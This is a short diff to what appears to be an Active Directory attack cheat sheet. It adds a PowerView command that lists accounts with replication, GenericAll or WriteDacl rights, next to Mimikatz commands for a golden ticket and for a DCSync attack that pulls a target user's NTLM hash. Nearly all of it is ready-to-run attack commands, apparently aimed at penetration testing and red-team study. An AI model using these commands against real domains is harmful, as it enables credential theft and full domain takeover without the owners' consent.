@@ -647,6 +647,8 @@ kerberos::golden /sid:S-1-5-21-809893099-1472282828-2400958209 /domain:testad.lo
 # 2. Replicating Directory Changes All
 # 3. Replicating Directory Changes in Filtered Set
 #By default Domain- and Enterprise Admins and Administrators groups have these rights.
+#You can check who has these rights with PowerView:
+#Get-ObjectAcl -DistinguishedName "dc=testad,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 #If you have an account with these righs under your control, you can perform dcsync attack with Mimikatz, just define the user whose credentials you're targeting, should result
 #amongst other things with the targeted user's NTLM hash:
 lsadump::dcsync /user:testad\target-username
